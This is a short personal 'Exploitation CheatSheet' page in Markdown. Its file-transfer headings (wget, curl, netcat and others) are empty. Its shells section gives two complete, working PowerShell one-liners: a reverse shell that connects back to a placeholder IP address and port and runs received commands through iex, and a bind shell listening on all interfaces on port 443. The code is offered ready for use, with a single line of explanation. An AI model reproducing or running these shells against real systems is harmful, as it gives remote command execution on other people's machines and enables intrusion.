---
title: "Exploitation CheatSheet"
author: "Me"
date: "January 11, 2022"
output: html_document
---

# Exploitation CheatSheet
{:.no_toc}


1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# File transfers

## wget

## curl

## axel

## socat

## netcat

## powershell

# Shells

## Powershell reverse shell (one-liner)

````
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IPADDRESS',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
`````

## Powershell bind shell (one-liner)

````
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
`````
The System.Net.Sockets.TcpListener requires 2 arguments: the address to listen on and the port. By providing 0.0.0.0 as the local address, the bind shell will be available on all IP addresses on the system.

